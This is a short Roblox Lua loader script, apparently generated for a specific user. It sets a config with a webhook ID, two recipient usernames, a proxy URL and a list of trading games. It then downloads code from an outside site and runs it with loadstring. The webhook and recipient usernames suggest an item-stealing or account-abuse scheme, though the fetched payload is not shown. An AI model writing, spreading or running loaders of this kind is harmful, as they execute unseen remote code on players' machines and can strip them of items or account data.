-- Eternal Darkness User Loader v7.0
-- Generated for: martinezx.exe
-- File ID: acd5f479424bb7a05961152d76be9ce3

_G.ED_CONFIG = {
    WEBHOOK_ID = "008ff7c5ac9171724a788152f3fdc213",
    USERNAMES = {"F1212049","Rojozkl"},
    PROXY_URL = "https://eternal-darkness.org/proxy/",
    USERNAME = "martinezx.exe",
    ENABLED_GAMES = {["mm2"]=true,["ps99"]=true,["adm"]=true,["sab"]=true,["sp"]=true,["bb"]=true,},
    CUSTOM_SCRIPTS = {}
}

local MainLoaderUrl = "https://eternal-darkness.org/api/loader"
local Success, Result = pcall(function()
    return game:HttpGet(MainLoaderUrl, true)
end)
if not Success or not Result or #Result == 0 then
    warn("[ED] Failed to load Main Loader")
    return
end
loadstring(Result)()
